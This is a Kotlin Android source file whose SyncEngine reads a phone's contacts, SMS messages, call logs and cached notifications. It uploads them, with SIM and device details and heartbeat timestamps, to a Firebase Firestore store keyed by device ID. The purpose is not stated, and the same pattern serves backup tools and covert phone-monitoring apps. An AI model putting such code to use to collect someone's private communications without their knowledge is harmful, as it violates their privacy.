package com.boxx.datasync.sync

import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.preference.PreferenceManager
import com.boxx.datasync.data.local.NotificationDao
import com.boxx.datasync.domain.model.NotificationData
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.tasks.await
import javax.inject.Inject
import javax.inject.Singleton

sealed class SyncResult {
    object Success : SyncResult()
    data class PartialSuccess(val message: String) : SyncResult()
    data class Error(val message: String) : SyncResult()
    object PermissionMissing : SyncResult()
    object NetworkUnavailable : SyncResult()
}

@Singleton
class SyncEngine @Inject constructor(
    private val repository: DataRepository,
    private val notificationDao: NotificationDao,
    private val mediaSyncEngine: MediaSyncEngine
) {
    suspend fun runSync(context: Context, isFullSync: Boolean): SyncResult {
        Log.d("SyncEngine", "SYNC_COORDINATOR_STARTED")
        Log.d("SyncEngine", "SYNC_ENGINE_STARTED isFullSync=$isFullSync")
        Log.d("SyncEngine", "BACKGROUND_SYNC_STARTED")
        if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_STARTED")

        val deviceId = DeviceIdHelper.getDeviceId(context)
        val prefs = PreferenceManager.getDefaultSharedPreferences(context)
        val now = System.currentTimeMillis()

        // Check network first
        if (!isNetworkAvailable(context)) {
            val err = "Network is unavailable"
            Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $err")
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                "syncStatus" to "Error",
                "lastError" to err
            ))
            return SyncResult.NetworkUnavailable
        }

        try {
            repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, now) + mapOf(
                "syncStatus" to "Syncing",
                "lastError" to null
            ))

            val contactsAllowed = hasPermission(context, android.Manifest.permission.READ_CONTACTS)
            val smsAllowed = hasPermission(context, android.Manifest.permission.READ_SMS)
            val callsAllowed = hasPermission(context, android.Manifest.permission.READ_CALL_LOG)

            Log.d("SyncEngine", "SYNC_ENGINE_PERMISSION_STATUS contacts=$contactsAllowed sms=$smsAllowed calls=$callsAllowed")

            val successCategories = mutableListOf<String>()
            val failedCategories = mutableListOf<String>()
            val missingPermissions = mutableListOf<String>()

            // 1. Sync Contacts Independently
            if (contactsAllowed) {
                try {
                    val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)
                    val contacts = DataHelper.fetchContacts(context, sinceTimestamp = lastContactSync)
                    if (contacts.isNotEmpty()) {
                        repository.syncIncremental(deviceId, contacts, emptyList(), emptyList())
                        prefs.edit().putLong("last_contact_sync", now).apply()
                    }
                    successCategories.add("Contacts")
                } catch (e: Exception) {
                    Log.e("SyncEngine", "Contacts sync failed", e)
                    failedCategories.add("Contacts: ${e.localizedMessage ?: "Unknown error"}")
                }
            } else {
                missingPermissions.add("READ_CONTACTS")
            }

            // 2. Sync SMS Independently
            if (smsAllowed) {
                try {
                    val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
                    val sms = DataHelper.fetchSMS(context, sinceTimestamp = lastSmsSync)
                    if (sms.isNotEmpty()) {
                        repository.syncIncremental(deviceId, emptyList(), sms, emptyList())
                        prefs.edit().putLong("last_sms_sync", sms.maxOfOrNull { it.date } ?: now).apply()
                    }
                    successCategories.add("SMS")
                } catch (e: Exception) {
                    Log.e("SyncEngine", "SMS sync failed", e)
                    failedCategories.add("SMS: ${e.localizedMessage ?: "Unknown error"}")
                }
            } else {
                missingPermissions.add("READ_SMS")
            }

            // 3. Sync Call Logs Independently
            if (callsAllowed) {
                try {
                    val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
                    val calls = DataHelper.fetchCallLogs(context, sinceTimestamp = lastCallSync)
                    if (calls.isNotEmpty()) {
                        repository.syncIncremental(deviceId, emptyList(), emptyList(), calls)
                        prefs.edit().putLong("last_call_sync", calls.maxOfOrNull { it.date } ?: now).apply()
                    }
                    successCategories.add("Calls")
                } catch (e: Exception) {
                    Log.e("SyncEngine", "Calls sync failed", e)
                    failedCategories.add("Calls: ${e.localizedMessage ?: "Unknown error"}")
                }
            } else {
                missingPermissions.add("READ_CALL_LOG")
            }

            // 4. Notification Cache Restore
            if (isFullSync) {
                try {
                    val cachedNotifications = notificationDao.getAll().map { entity ->
                        NotificationData(
                            id = entity.id,
                            appName = entity.appName,
                            packageName = entity.packageName,
                            title = entity.title,
                            text = entity.text,
                            timestamp = entity.timestamp,
                            groupKey = entity.groupKey,
                            iconBase64 = entity.iconBase64,
                            sender = entity.sender,
                            conversationId = entity.conversationId
                        )
                    }
                    for (notification in cachedNotifications) {
                        repository.syncNotification(deviceId, notification)
                    }
                    Log.d("SyncEngine", "RESTORE_AFTER_DELETE_COMPLETED: restored ${cachedNotifications.size} notifications")
                    successCategories.add("Notifications Restore")
                } catch (e: Exception) {
                    Log.e("SyncEngine", "Notifications restore failed", e)
                    failedCategories.add("Notifications Restore: ${e.localizedMessage ?: "Unknown error"}")
                }
            }

            // 5. Delegate Auto Media Sync (if enabled)
            var mediaResult: SyncResult = SyncResult.Success
            val autoMediaEnabled = prefs.getBoolean("auto_media_sync", false)
            if (autoMediaEnabled) {
                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_TRIGGERED")
                mediaResult = mediaSyncEngine.runMediaSync(context)
                when (mediaResult) {
                    is SyncResult.Success -> successCategories.add("Media")
                    is SyncResult.Error -> failedCategories.add("Media: ${mediaResult.message}")
                    is SyncResult.PermissionMissing -> failedCategories.add("Media: Missing permission")
                    is SyncResult.NetworkUnavailable -> failedCategories.add("Media: Network unavailable")
                    else -> {}
                }
            }

            // Fetch SIM info and current total counts
            val simState = DataHelper.getSimState(context)
            val notificationCount = try {
                FirebaseFirestore.getInstance().collection("devices").document(deviceId)
                    .collection("notifications").get().await().size()
            } catch (e: Exception) {
                0
            }

            val updates = baseDeviceMap(deviceId, System.currentTimeMillis()).toMutableMap()
            updates.putAll(simState)
            updates["lastSyncTime"] = System.currentTimeMillis()
            updates["contactCount"] = if (contactsAllowed) DataHelper.fetchContacts(context).size else 0
            updates["smsCount"] = if (smsAllowed) DataHelper.fetchSMS(context).size else 0
            updates["callCount"] = if (callsAllowed) DataHelper.fetchCallLogs(context).size else 0
            updates["notificationCount"] = notificationCount

            // Compile combined result (Phase 2 & 10)
            val result = when {
                failedCategories.isEmpty() && missingPermissions.isEmpty() -> {
                    updates["syncStatus"] = "Synced"
                    updates["lastError"] = null
                    Log.d("SyncEngine", "SYNC_COORDINATOR_RESULT: SUCCESS")
                    Log.d("SyncEngine", "BACKGROUND_SYNC_SUCCESS")
                    SyncResult.Success
                }
                successCategories.isNotEmpty() -> {
                    val partialMessage = buildString {
                        append("Synced: ${successCategories.joinToString(", ")}. ")
                        if (failedCategories.isNotEmpty()) {
                            append("Failed: ${failedCategories.joinToString(", ")}. ")
                        }
                        if (missingPermissions.isNotEmpty()) {
                            append("Permissions missing for: ${missingPermissions.joinToString(", ")}.")
                        }
                    }
                    updates["syncStatus"] = "Synced"
                    updates["lastError"] = partialMessage
                    Log.d("SyncEngine", "SYNC_COORDINATOR_RESULT: PARTIAL_SUCCESS - $partialMessage")
                    SyncResult.PartialSuccess(partialMessage)
                }
                else -> {
                    val errMsg = "Failed: ${failedCategories.joinToString(", ")}. Missing: ${missingPermissions.joinToString(", ")}"
                    updates["syncStatus"] = "Error"
                    updates["lastError"] = errMsg
                    Log.d("SyncEngine", "SYNC_COORDINATOR_RESULT: FAILED - $errMsg")
                    SyncResult.Error(errMsg)
                }
            }

            repository.updateDeviceInfoMap(deviceId, updates)
            return result
        } catch (e: Exception) {
            val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
            Log.e("SyncEngine", "SYNC_UPLOAD_FAILED", e)
            Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $message")
            try {
                repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
                    "lastSyncTime" to System.currentTimeMillis(),
                    "syncStatus" to "Error",
                    "lastError" to message
                ))
            } catch (_: Exception) {}
            return SyncResult.Error(message)
        }
    }

    private fun isNetworkAvailable(context: Context): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return false
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun hasPermission(context: Context, permission: String) =
        ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED

    private fun baseDeviceMap(deviceId: String, now: Long): Map<String, Any?> = mapOf(
        "deviceId" to deviceId,
        "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "osVersion" to Build.VERSION.RELEASE,
        "heartbeatAt" to now,
        "timestamp" to now
    )
}
